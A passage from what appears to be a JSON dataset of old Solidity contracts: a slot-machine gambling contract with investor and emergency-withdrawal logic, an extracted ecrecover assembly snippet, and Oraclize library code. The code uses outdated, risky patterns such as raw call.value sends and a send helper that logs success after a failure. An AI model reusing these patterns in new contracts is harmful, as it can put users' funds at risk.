searchSmallestInvestor();\n return getBalance(investors[investorID].investorAddress);\n }\n else {\n return 0;\n }\n }\n function getLossesShare(address currentInvestor)\n constant\n returns (uint) {\n return investors[investorIDs[currentInvestor]].amountInvested * (investorsLosses) / invested;\n }\n function getProfitShare(address currentInvestor)\n constant\n returns (uint) {\n return investors[investorIDs[currentInvestor]].amountInvested * (investorsProfit) / invested;\n }\n function getBalance(address currentInvestor)\n constant\n returns (uint) {\n uint invested = investors[investorIDs[currentInvestor]].amountInvested;\n uint profit = getProfitShare(currentInvestor);\n uint losses = getLossesShare(currentInvestor);\n if ((invested + profit < profit) ||\n (invested + profit < invested) ||\n (invested + profit < losses))\n return 0;\n else\n return invested + profit - losses;\n }\n function searchSmallestInvestor()\n constant\n returns(uint) {\n uint investorID = 1;\n for (uint i = 1; i <= numInvestors; i++) {\n if (getBalance(investors[i].investorAddress) < getBalance(investors[investorID].investorAddress)) {\n investorID = i;\n }\n }\n return investorID;\n }\n function addInvestorAtID(uint id)\n private {\n investorIDs[msg.sender] = id;\n investors[id].investorAddress = msg.sender;\n investors[id].amountInvested = msg.value;\n invested += msg.value;\n LOG_InvestorEntrance(msg.sender, msg.value);\n }\n function profitDistribution()\n private\n onlyIfProfitNotDistributed {\n uint copyInvested;\n for (uint i = 1; i <= numInvestors; i++) {\n address currentInvestor = investors[i].investorAddress;\n uint profitOfInvestor = getProfitShare(currentInvestor);\n uint lossesOfInvestor = getLossesShare(currentInvestor);\n if ((investors[i].amountInvested + profitOfInvestor >= investors[i].amountInvested) &&\n (investors[i].amountInvested + profitOfInvestor >= lossesOfInvestor)) {\n investors[i].amountInvested += profitOfInvestor - lossesOfInvestor;\n LOG_InvestorCapitalUpdate(currentInvestor, (int) (profitOfInvestor - lossesOfInvestor));\n }\n else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n if (copyInvested + investors[i].amountInvested >= copyInvested)\n copyInvested += investors[i].amountInvested;\n }\n delete investorsProfit;\n delete investorsLosses;\n invested = copyInvested;\n profitDistributed = true;\n }\n function increaseInvestment()\n payable\n onlyIfNotStopped\n onlyMoreThanZero\n onlyInvestors {\n profitDistribution();\n investors[investorIDs[msg.sender]].amountInvested += msg.value;\n invested += msg.value;\n }\n function newInvestor()\n payable\n onlyIfNotStopped\n onlyMoreThanZero\n onlyNotInvestors\n onlyMoreThanMinInvestment\n investorsInvariant {\n profitDistribution();\n if (numInvestors == MAX_INVESTORS) {\n uint smallestInvestorID = searchSmallestInvestor();\n divest(investors[smallestInvestorID].investorAddress);\n }\n numInvestors++;\n addInvestorAtID(numInvestors);\n }\n function divest()\n onlyInvestors {\n divest(msg.sender);\n }\n function divest(address currentInvestor)\n internal\n investorsInvariant {\n profitDistribution();\n uint currentID = investorIDs[currentInvestor];\n uint amountToReturn = getBalance(currentInvestor);\n if ((invested >= investors[currentID].amountInvested)) {\n invested -= investors[currentID].amountInvested;\n uint divestFeeAmount = (amountToReturn*divestFee)/10000;\n amountToReturn -= divestFeeAmount;\n delete investors[currentID];\n delete investorIDs[currentInvestor];\n if (currentID != numInvestors) {\n Investor lastInvestor = investors[numInvestors];\n investorIDs[lastInvestor.investorAddress] = currentID;\n investors[currentID] = lastInvestor;\n delete investors[numInvestors];\n }\n numInvestors--;\n safeSend(currentInvestor, amountToReturn);\n safeSend(houseAddress, divestFeeAmount);\n LOG_InvestorExit(currentInvestor, amountToReturn);\n } else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n }\n function forceDivestOfAllInvestors()\n onlyOwner {\n uint copyNumInvestors = numInvestors;\n for (uint i = 1; i <= copyNumInvestors; i++) {\n divest(investors[1].investorAddress);\n }\n }\n function safeSend(address addr, uint value)\n internal {\n if (value == 0) {\n LOG_ZeroSend();\n return;\n }\n if (this.balance < value) {\n LOG_ValueIsTooBig();\n return;\n }\n if (!(addr.call.gas(safeGas).value(value)())) {\n LOG_FailedSend(addr, value);\n if (addr != houseAddress) {\n if (!(houseAddress.call.gas(safeGas).value(value)())) LOG_FailedSend(houseAddress, value);\n }\n }\n LOG_SuccessfulSend(addr,value);\n }\n}\ncontract EmergencyWithdrawalModule is usingInvestorsModule {\n uint constant EMERGENCY_WITHDRAWAL_RATIO = 80;\n uint constant EMERGENCY_TIMEOUT = 3 days;\n struct WithdrawalProposal {\n address toAddress;\n uint atTime;\n }\n WithdrawalProposal public proposedWithdrawal;\n event LOG_EmergencyWithdrawalProposed();\n event LOG_EmergencyWithdrawalFailed(address withdrawalAddress);\n event LOG_EmergencyWithdrawalSucceeded(address withdrawalAddress, uint amountWithdrawn);\n event LOG_EmergencyWithdrawalVote(address investor, bool vote);\n modifier onlyAfterProposed {\n assert(proposedWithdrawal.toAddress != 0);\n _;\n }\n modifier onlyIfEmergencyTimeOutHasPassed {\n assert(proposedWithdrawal.atTime + EMERGENCY_TIMEOUT <= now);\n _;\n }\n function voteEmergencyWithdrawal(bool vote)\n onlyInvestors\n onlyAfterProposed\n onlyIfStopped {\n investors[investorIDs[msg.sender]].votedForEmergencyWithdrawal = vote;\n LOG_EmergencyWithdrawalVote(msg.sender, vote);\n }\n function proposeEmergencyWithdrawal(address withdrawalAddress)\n onlyIfStopped\n onlyOwner {\n for (uint i = 1; i <= numInvestors; i++) {\n delete investors[i].votedForEmergencyWithdrawal;\n }\n proposedWithdrawal = WithdrawalProposal(withdrawalAddress, now);\n LOG_EmergencyWithdrawalProposed();\n }\n function executeEmergencyWithdrawal()\n onlyOwner\n onlyAfterProposed\n onlyIfStopped\n onlyIfEmergencyTimeOutHasPassed {\n uint numOfVotesInFavour;\n uint amountToWithdraw = this.balance;\n for (uint i = 1; i <= numInvestors; i++) {\n if (investors[i].votedForEmergencyWithdrawal == true) {\n numOfVotesInFavour++;\n delete investors[i].votedForEmergencyWithdrawal;\n }\n }\n if (numOfVotesInFavour >= EMERGENCY_WITHDRAWAL_RATIO * numInvestors / 100) {\n if (!proposedWithdrawal.toAddress.send(amountToWithdraw)) {\n LOG_EmergencyWithdrawalFailed(proposedWithdrawal.toAddress);\n }\n else {\n LOG_EmergencyWithdrawalSucceeded(proposedWithdrawal.toAddress, amountToWithdraw);\n }\n }\n else {\n revert();\n }\n }\n function forceDivestOfOneInvestor(address currentInvestor)\n onlyOwner\n onlyIfStopped {\n divest(currentInvestor);\n delete proposedWithdrawal;\n }\n}\ncontract Slot is usingOraclize, EmergencyWithdrawalModule, DSMath {\n uint constant INVESTORS_EDGE = 200;\n uint constant HOUSE_EDGE = 50;\n uint constant CAPITAL_RISK = 250;\n uint constant MAX_SPINS = 16;\n uint minBet = 1 wei;\n struct SpinsContainer {\n address playerAddress;\n uint nSpins;\n uint amountWagered;\n }\n mapping (bytes32 => SpinsContainer) spins;\n uint[] public probabilities;\n uint[] public multipliers;\n uint public totalAmountWagered;\n event LOG_newSpinsContainer(bytes32 myid, address playerAddress, uint amountWagered, uint nSpins);\n event LOG_SpinExecuted(bytes32 myid, address playerAddress, uint spinIndex, uint numberDrawn);\n event LOG_SpinsContainerInfo(bytes32 myid, address playerAddress, uint netPayout);\n LedgerProofVerifyI externalContract;\n function Slot(address _verifierAddr) {\n externalContract = LedgerProofVerifyI(_verifierAddr);\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n externalContract.external_oraclize_randomDS_setCommitment(queryId, commitment);\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n assert(externalContract.external_oraclize_randomDS_proofVerify(_proof, _queryId, bytes(_result), oraclize_getNetworkName()));\n _;\n }\n modifier onlyOraclize {\n assert(msg.sender == oraclize_cbAddress());\n _;\n }\n modifier onlyIfSpinsExist(bytes32 myid) {\n assert(spins[myid].playerAddress != address(0x0));\n _;\n }\n function isValidSize(uint _amountWagered)\n constant\n returns(bool) {\n uint netPotentialPayout = (_amountWagered * (10000 - INVESTORS_EDGE) * multipliers[0])/ 10000;\n uint maxAllowedPayout = (CAPITAL_RISK * getBankroll())/10000;\n return ((netPotentialPayout <= maxAllowedPayout) && (_amountWagered >= minBet));\n }\n modifier onlyIfEnoughFunds(bytes32 myid) {\n if (isValidSize(spins[myid].amountWagered)) {\n _;\n }\n else {\n safeSend(spins[myid].playerAddress, spins[myid].amountWagered);\n delete spins[myid];\n return;\n }\n }\n modifier onlyLessThanMaxSpins (uint _nSpins) {\n assert(_nSpins <= MAX_SPINS);\n _;\n }\n modifier onlyIfFair(uint[] _prob, uint[] _payouts) {\n if (_prob.length != _payouts.length) revert();\n uint sum = 0;\n for (uint i = 0; i <_prob.length; i++) {\n sum += _prob[i] * _payouts[i];\n }\n assert(sum == 10000);\n _;\n }\n function()\n payable {\n buySpins(1);\n }\n function buySpins(uint _nSpins)\n payable\n onlyLessThanMaxSpins(_nSpins)\n onlyIfNotStopped {\n uint gas = _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", gas);\n if (oraclizeFee/multipliers[0] + oraclizeFee >= msg.value) revert();\n uint amountWagered = msg.value - oraclizeFee;\n uint maxNetPotentialPayout = (amountWagered * (10000 - INVESTORS_EDGE) * multipliers[0])/10000;\n uint maxAllowedPayout = (CAPITAL_RISK * getBankroll())/10000;\n if ((maxNetPotentialPayout <= maxAllowedPayout) && (amountWagered >= minBet)) {\n bytes32 queryId = oraclize_newRandomDSQuery(0, 2*_nSpins, gas);\n spins[queryId] =\n SpinsContainer(msg.sender,\n _nSpins,\n amountWagered\n );\n LOG_newSpinsContainer(queryId, msg.sender, amountWagered, _nSpins);\n totalAmountWagered += amountWagered;\n } else {\n revert();\n }\n }\n function executeSpins(bytes32 myid, bytes randomBytes)\n private\n returns(uint)\n {\n uint amountWon = 0;\n uint numberDrawn = 0;\n uint rangeUpperEnd = 0;\n uint nSpins = spins[myid].nSpins;\n for (uint i = 0; i < 2*nSpins; i += 2) {\n numberDrawn = ((uint(randomBytes[i])*256 + uint(randomBytes[i+1]))*10000)/2**16;\n rangeUpperEnd = 0;\n LOG_SpinExecuted(myid, spins[myid].playerAddress, i/2, numberDrawn);\n for (uint j = 0; j < probabilities.length; j++) {\n rangeUpperEnd += probabilities[j];\n if (numberDrawn < rangeUpperEnd) {\n amountWon += (spins[myid].amountWagered * multipliers[j]) / nSpins;\n break;\n }\n }\n }\n return amountWon;\n }\n function sendPayout(bytes32 myid, uint payout) private {\n if (payout >= spins[myid].amountWagered) {\n investorsLosses += sub(payout, spins[myid].amountWagered);\n payout = (payout*(10000 - INVESTORS_EDGE))/10000;\n }\n else {\n uint tempProfit = add(investorsProfit, sub(spins[myid].amountWagered, payout));\n investorsProfit += (sub(spins[myid].amountWagered, payout)*(10000 - HOUSE_EDGE))/10000;\n safeSend(houseAddress, sub(tempProfit, investorsProfit));\n }\n LOG_SpinsContainerInfo(myid, spins[myid].playerAddress, payout);\n safeSend(spins[myid].playerAddress, payout);\n }\n function __callback(bytes32 myid, string result, bytes _proof)\n onlyOraclize\n onlyIfSpinsExist(myid)\n onlyIfEnoughFunds(myid)\n oraclize_randomDS_proofVerify(myid, result, _proof)\n {\n uint payout = executeSpins(myid, bytes(result));\n sendPayout(myid, payout);\n delete profitDistributed;\n delete spins[myid];\n }\n function setConfiguration(uint[] _probabilities, uint[] _multipliers)\n onlyOwner\n onlyIfFair(_probabilities, _multipliers) {\n oraclize_setProof(proofType_Ledger);\n delete probabilities;\n delete multipliers;\n uint lastProbability = 0;\n uint lastMultiplier = 2**256 - 1;\n for (uint i = 0; i < _probabilities.length; i++) {\n probabilities.push(_probabilities[i]);\n if (lastProbability >= _probabilities[i]) revert();\n lastProbability = _probabilities[i];\n }\n for (i = 0; i < _multipliers.length; i++) {\n multipliers.push(_multipliers[i]);\n if (lastMultiplier <= _multipliers[i]) revert();\n lastMultiplier = _multipliers[i];\n }\n }\n function setMinBet(uint _minBet) onlyOwner {\n minBet = _minBet;\n }\n function getSpinsContainer(bytes32 myid)\n constant\n returns(address, uint) {\n return (spins[myid].playerAddress, spins[myid].amountWagered);\n }\n function getMinAmountToWager(uint _nSpins)\n onlyLessThanMaxSpins(_nSpins)\n constant\n returns(uint) {\n uint gas = _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", gas);\n return minBet + oraclizeFee/multipliers[0] + oraclizeFee;\n }\n function getMaxAmountToWager(uint _nSpins)\n onlyLessThanMaxSpins(_nSpins)\n constant\n returns(uint) {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas);\n uint maxWage = (CAPITAL_RISK * getBankroll())*10000/((10000 - INVESTORS_EDGE)*10000*multipliers[0]);\n return maxWage + oraclizeFee;\n }\n}",
  "extract_feature": [
    "function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\nbool ret;\naddress addr;\nassembly {\nlet size := mload(0x40)\nmstore(size, hash)\nmstore(add(size, 32), v)\nmstore(add(size, 64), r)\nmstore(add(size, 96), s)\nret := call(3000, 1, 0, size, 128, size, 32)\naddr := mload(size)\n}\nreturn (ret, addr);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb162d"
  },
  "filename": "39183.sol",
  "content": "pragma solidity ^0.4.11;\npragma solidity ^0.4.10;\ncontract DSMath {\n function add(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x + y) >= x);\n }\n function sub(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x - y) <= x);\n }\n function mul(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x * y) >= x);\n }\n function div(uint256 x, uint256 y) constant internal returns (uint256 z) {\n z = x / y;\n }\n function min(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x >= y ? x : y;\n }\n function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x + y) >= x);\n }\n function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x - y) <= x);\n }\n function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x * y) >= x);\n }\n function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = x / y;\n }\n function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x <= y ? x : y;\n }\n function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x >= y ? x : y;\n }\n function imin(int256 x, int256 y) constant internal returns (int256 z) {\n return x <= y ? x : y;\n }\n function imax(int256 x, int256 y) constant internal returns (int256 z) {\n return x >= y ? x : y;\n }\n uint128 constant WAD = 10 ** 18;\n function wadd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function wsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function wmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + WAD / 2) / WAD);\n }\n function wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * WAD + y / 2) / y);\n }\n function wmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function wmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n uint128 constant RAY = 10 ** 27;\n function radd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function rsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + RAY / 2) / RAY);\n }\n function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * RAY + y / 2) / y);\n }\n function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) {\n z = n % 2 != 0 ? x : RAY;\n for (n /= 2; n != 0; n /= 2) {\n x = rmul(x, x);\n if (n % 2 != 0) {\n z = rmul(z, x);\n }\n }\n }\n function rmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function rmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n function cast(uint256 x) constant internal returns (uint128 z) {\n assert((z = uint128(x)) == x);\n }\n}\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n function setConfig(bytes32 _config);\n function setCustomGasPrice(uint _gasPrice);\n function randomDS_getSessionPubKeyHash() returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0)) oraclize_setNetwork(networkID_auto);\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n }\n function oraclize_useCoupon(string code) oraclizeAPI internal {\n oraclize.useCoupon(code);\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 